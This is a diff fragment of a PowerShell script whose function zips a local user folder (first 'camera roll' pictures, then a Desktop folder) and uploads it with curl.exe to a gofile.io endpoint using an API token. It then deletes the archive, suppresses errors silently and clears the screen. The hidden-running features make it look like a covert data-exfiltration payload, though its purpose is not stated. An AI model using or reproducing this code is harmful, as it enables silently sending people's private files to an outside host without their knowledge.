@@ -17,7 +17,7 @@ function Upload-direToGofile {
         $uploadUri = "https://store1.gofile.io/uploadFile"
         
         curl.exe -F "file=@$zipPath" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
-            
+        Start-Sleep -Seconds 1 
         Remove-Item $zipPath -Force
     
         
@@ -27,5 +27,5 @@ function Upload-direToGofile {
    }
     catch {Write-Host ""}
 }
-Upload-direToGofile -Path "C:\users\onsbt\onedrive\pictures\camera roll" -newFolderId "95adad47-12b6-47e0-bc26-c895ea8bacb1"
+Upload-direToGofile -Path "c:\Users\onsbt\OneDrive\Desktop\s2" -newFolderId "95adad47-12b6-47e0-bc26-c895ea8bacb1"
 cls
